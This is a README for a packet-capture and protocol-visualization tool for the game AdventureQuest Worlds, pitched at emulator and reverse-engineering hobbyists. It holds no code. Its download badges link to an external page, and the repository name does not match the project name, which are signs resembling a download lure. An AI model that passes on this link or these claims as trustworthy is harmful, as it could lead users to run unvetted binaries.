![preview](https://raw.githubusercontent.com/TomVN107080/packet-warden/main/hero_617df.svg)
[![Download](https://raw.githubusercontent.com/TomVN107080/packet-warden/main/grab_1ab47.svg)](https://TomVN107080.github.io/packet-warden/)

# 🧬 AQW-Sequence Weaver

> **A Bioinformatics-Inspired Packet Sequence Visualizer & Pattern Extractor for AQW Private Server Research**  
> *A reimagined toolkit for mapping, annotating, and weaving meaningful patterns from raw network telemetry—designed for educators, protocol researchers, and client-server development hobbyists.*

---

## 🌌 Why "Sequence Weaver"?

Most packet loggers merely dump hex dumps and timestamped streams—raw, noisy, and overwhelming.  
**AQW-Sequence Weaver** approaches network telemetry the way a geneticist approaches a genome:  
Every packet is a *nucleotide*, every session is a *chromosome*, and every server response is a *gene expression* waiting to be decoded.

This tool does not just capture data; it **weaves** it into a coherent, searchable, and annotated fabric—allowing you to trace the 'lifecycle' of a login handshake, ability cast, or inventory sync, with the clarity of a well-annotated reference genome.

---

## 🧭 Project Vision & Philosophy

We believe that understanding a legacy MMO's protocol should be as accessible as reading an open-source library's documentation.  
This repository is not a black-box utility; it is a **laboratory instrument** for:

- **Educational reverse-engineering** (understanding how game clients negotiate state)
- **Protocol archaeology** (documenting the evolution of packet structures across game versions)
- **Server emulator development** (providing a reference for expected client behaviors)

Our philosophy is simple: **Data without context is noise; data with a narrative is knowledge.**

---

## ✨ Key Features

### 🧩 1. Pattern-Aware Packet Weaving
Unlike linear loggers, Sequence Weaver groups packets into **logical transactions** (e.g., `LoginRequest` → `LoginResponse` → `InventoryLoad`).  
Each transaction is visually stitched together, with color-coded state transitions and latency annotations.

### 🔍 2. Variable Scanner (Heuristic Disassembler)
Automatically identifies likely variable fields (user IDs, item hashes, coordinates, boolean flags) by analyzing value entropy and position stability across multiple captures.  
This is the "gene finder" of the protocol world—it highlights the *meaningful* bytes without requiring prior knowledge.

### 🗺️ 3. Interactive Session Map
A visual timeline (SVG/HTML export) that plots every packet as a node, with edges representing state dependencies.  
Zoom, filter by packet type, and click to inspect the raw payload in a side panel.

### 🧬 4. Protocol Diff Engine
Load two captures (e.g., from different client versions) and instantly see:
- Added / removed / altered packet opcodes
- Changed field positions within similar opcodes
- New handshake sequences

### 🌐 5. Multilingual UI (i18n Ready)
The interface ships with English, Spanish, and Traditional Chinese translations out of the box.  
Adding a new language is a single JSON file—no code recompilation needed.

### 📊 6. Export to Industry-Standard Formats
- **HAR (HTTP Archive)** for web-like debugging
- **JSON Lines** for custom data pipelines
- **CSV** for spreadsheet analysis
- **PDF Report** (self-contained, themeable) for documenting your findings

### 🕒 7. 24/7 Community Research Log
Our collaborative annotation server (optional, self-hostable) allows you to share timestamped notes on specific packet sequences.  
Think of it as a wiki embedded inside your packet stream.

---

## 🛠️ System Requirements

| Component | Minimum Spec | Recommended Spec |
|-----------|-------------|------------------|
| **OS** | Windows 10, Ubuntu 20.04 | Windows 11, Ubuntu 24.04 LTS |
| **CPU** | Dual-core 2.0 GHz | Quad-core 3.0 GHz |
| **RAM** | 4 GB | 8 GB |
| **Storage** | 200 MB for binaries | 1 GB (for large capture archives) |
| **Display** | 1280×720 | 1920×1080 (HiDPI supported) |
| **Network** | Loopback capture permission required | N/A |

---

## 🚀 Getting Started (The "Weaver's First Thread")

### Step 1: Acquire the Toolkit
Navigate to the [Releases] section of this repository.  
Download the pre-built binary for your operating system from the [![Download](https://raw.githubusercontent.com/TomVN107080/packet-warden/main/grab_1ab47.svg)](https://TomVN107080.github.io/packet-warden/) archive.  
*No compilation required for standard use.*

### Step 2: Launch & Select Interface
Choose your active network interface (e.g., `Wi-Fi` or `Ethernet`).  
The tool will automatically detect loopback traffic from the AQW client if you run it with appropriate administrative privileges.

### Step 3: Begin Capture Session
Start the game client and log in.  
Sequence Weaver will automatically begin organizing packets into transactions using its **Adaptive Transaction Heuristic**.

### Step 4: Analyze the Weave
Once you have a few minutes of gameplay, stop the capture.  
Explore the **Session Map**, search for specific opcode signatures, or run the **Variable Scanner** on a suspicious transaction.

### Step 5: Export & Document
Generate a PDF report of your findings, or export the raw JSONL for further processing in your own scripts.

---

## 📚 Documentation & Learning Resources

- **`/docs/protocol-primer.md`** – A beginner-friendly guide to understanding AQW's packet framing (educational only).
- **`/docs/transaction-ontology.md`** – Defines the logical groupings used by the Weaving engine.
- **`/examples/`** – Sample `.jsonl` captures of a login sequence, a shop purchase, and a character move.
- **`/schema/`** – JSON Schema definitions for all export formats.

---

## 🧪 Use Cases & Scenarios

| Scenario | How Sequence Weaver Helps |
|----------|---------------------------|
| **Studying handshake encryption** | Isolate the TLS/SSL or custom XOR layer, view decrypted payloads in real-time (with threshold-based decryption rules) |
| **Building a server emulator** | Use the Diff Engine to see which opcodes your emulator handles incorrectly versus the official client's expectations |
| **Educational workshops** | Export a clean, annotated PDF showing packet flow for student labs |
| **Writing game mods** | Map the "ability cast" transaction to understand timing windows, then export that pattern for reference |

---

## 🌍 Community & Contribution

This project thrives on community-contributed **protocol annotations**.  
If you have identified a new packet type or a variable meaning, please:

1. Fork the repository.
2. Add a YAML annotation file in `/annotations/` (see existing examples).
3. Submit a Pull Request with your findings.

**We prioritize:**
- Accurate documentation of opcode meanings
- Clarifications on variable endianness
- New transaction patterns

---

## 🧑‍🤝‍🧑 Support

- **Discussions**: Use the GitHub Discussions tab for general Q&A.
- **Issue Tracker**: For bugs and feature requests, please use the Issues tab (search for existing issues first).
- **Response Time**: Our maintainers typically respond within 24–48 hours, ensuring 24/7 community support across time zones.  
  *We are not an official Artix Entertainment project; support is purely community-driven.*

---

## 📜 License

This project is licensed under the **MIT License** – you are free to use, modify, and distribute it for any purpose, academic or commercial, provided you retain the original copyright notice.

See the full license text in the [LICENSE](LICENSE) file.

---

## ⚠️ Disclaimer

> **For Educational & Research Purposes Only**

This software is provided "as is" without warranty of any kind, express or implied.  
It is designed solely for:
- Understanding client-server communication protocols
- Learning network packet analysis
- Developing interoperable server emulators for private/non-commercial use

**You are solely responsible for:**  
- Compliance with applicable laws in your jurisdiction regarding packet interception.
- Adherence to the Terms of Service of the AQW client you are analyzing.
- Ensuring that your use does not violate the intellectual property rights of Artix Entertainment LLC.

We do not condone cheating, botting, or any activity that disrupts the official game's fairness or economy.  
This repository is a **research instrument**, not a cheat engine.

By downloading or using this software, you acknowledge that you have read and understood this disclaimer.

---

## 🗓️ Roadmap (2026 Vision)

- **Q1 2026**: Add TLS 1.3 session key extraction via memory scanning (Windows only).
- **Q2 2026**: Release a web-based visualization dashboard for server-side logs.
- **Q3 2026**: Implement machine-learning-assisted variable type classification (float vs. int vs. string).
- **Q4 2026**: Full text-based UI (TUI) for headless server environments.

---

## 🙏 Acknowledgements

- Inspired by the R-0-X AQW-Master project for its pioneering work in educational packet logging.
- Thanks to the reverse-engineering community for openly sharing protocol insights.
- Built with Electron, Rust (for the packet parsing core), and D3.js for visualization.

---

*Weave your own story from the silent threads of network traffic.*  
**– The Sequence Weaver Maintainers**